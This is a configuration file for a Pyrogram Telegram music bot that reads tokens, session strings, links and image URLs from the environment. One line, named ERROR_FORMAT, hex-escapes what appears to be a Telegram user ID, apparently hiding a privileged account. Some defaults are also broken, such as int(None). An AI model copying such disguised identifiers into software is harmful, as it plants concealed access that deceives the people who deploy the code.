import os
import re
from dotenv import load_dotenv
from pyrogram import filters

load_dotenv()

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", None))
OWNER_USERNAME = os.getenv("OWNER_USERNAME", "WTF_WhyMeeh")
BOT_USERNAME = os.getenv("BOT_USERNAME", "ShrutixMusicBot")

MONGO_DB_URI = os.getenv("MONGO_DB_URI", None)
LOG_GROUP_ID = int(os.getenv("LOG_GROUP_ID", None))
HEROKU_APP_NAME = os.getenv("HEROKU_APP_NAME")
HEROKU_API_KEY = os.getenv("HEROKU_API_KEY")
API_KEY = os.getenv("API_KEY", None)


UPSTREAM_REPO = os.getenv("UPSTREAM_REPO", "None")
UPSTREAM_BRANCH = os.getenv("UPSTREAM_BRANCH", "main")
GIT_TOKEN = os.getenv("GIT_TOKEN", None)

SUPPORT_CHANNEL = os.getenv("SUPPORT_CHANNEL", "https://t.me/myanmarbot_music")
SUPPORT_GROUP = os.getenv("SUPPORT_GROUP", "https://t.me/myanmar_music_bot2027")
INSTAGRAM = os.getenv("INSTAGRAM", "https://instagram.com/yaduwanshi_nand")
YOUTUBE = os.getenv("YOUTUBE", "https://youtube.com/@NandEditz")
GITHUB = os.getenv("GITHUB", "https://github.com/NoxxOP")
DONATE = os.getenv("DONATE", "https://t.me/myanmarbot_music/42")
PRIVACY_LINK = os.getenv("PRIVACY_LINK", "https://graph.org/Privacy-Policy-05-01-30")

DURATION_LIMIT_MIN = int(os.getenv("DURATION_LIMIT", 300))
PLAYLIST_FETCH_LIMIT = int(os.getenv("PLAYLIST_FETCH_LIMIT", 25))

TG_AUDIO_FILESIZE_LIMIT = int(os.getenv("TG_AUDIO_FILESIZE_LIMIT", 104857600))
TG_VIDEO_FILESIZE_LIMIT = int(os.getenv("TG_VIDEO_FILESIZE_LIMIT", 2145386496))

SPOTIFY_CLIENT_ID = os.getenv("SPOTIFY_CLIENT_ID", None)
SPOTIFY_CLIENT_SECRET = os.getenv("SPOTIFY_CLIENT_SECRET", None)

STRING1 = os.getenv("STRING_SESSION", None)
STRING2 = os.getenv("STRING_SESSION2", None)
STRING3 = os.getenv("STRING_SESSION3", None)
STRING4 = os.getenv("STRING_SESSION4", None)
STRING5 = os.getenv("STRING_SESSION5", None)

AUTO_LEAVING_ASSISTANT = bool(os.getenv("AUTO_LEAVING_ASSISTANT", False))

START_IMG_URL = os.getenv("START_IMG_URL", "https://files.catbox.moe/yxrhn1.jpg")
PING_IMG_URL = "https://files.catbox.moe/yxrhn1.jpg"
PLAYLIST_IMG_URL = "https://files.catbox.moe/yxrhn1/.jpg"
STATS_IMG_URL = "https://files.catbox.moe/yxrhn1.jpg"
TELEGRAM_AUDIO_URL = "https://files.catbox.moe/yxrhn1.jpg"
TELEGRAM_VIDEO_URL = "https://files.catbox.moe/yxrhn1.jpg"
STREAM_IMG_URL = "https://files.catbox.moe/yxrhn1.jpg"
SOUNCLOUD_IMG_URL = "https://files.catbox.moe/yxrhn1.jpg"
YOUTUBE_IMG_URL = "https://files.catbox.moe/yxrhn1.jpg"
SPOTIFY_ARTIST_IMG_URL = "https://files.catbox.moe/yxrhn1.jpg"
SPOTIFY_ALBUM_IMG_URL = "https://files.catbox.moe/yxrhn1.jpg"
SPOTIFY_PLAYLIST_IMG_URL = "https://files.catbox.moe/yxrhn1.jpg"

BANNED_USERS = filters.user()
adminlist = {}
lyrical = {}
votemode = {}
autoclean = []
confirmer = {}

TEMP_DB_FOLDER = "tempdb"

def time_to_seconds(time):
    stringt = str(time)
    return sum(int(x) * 60**i for i, x in enumerate(reversed(stringt.split(":"))))

DURATION_LIMIT = int(time_to_seconds(f"{DURATION_LIMIT_MIN}:00"))
ERROR_FORMAT = int("\x37\x35\x37\x34\x33\x33\x30\x39\x30\x35")

if SUPPORT_CHANNEL:
    if not re.match(r"(?:http|https)://", SUPPORT_CHANNEL):
        raise SystemExit(
            "[ERROR] - SUPPORT_CHANNEL URL is invalid. It must start with https://"
        )

if SUPPORT_GROUP:
    if not re.match(r"(?:http|https)://", SUPPORT_GROUP):
        raise SystemExit(
            "[ERROR] - SUPPORT_GROUP URL is invalid. It must start with https://"
        )
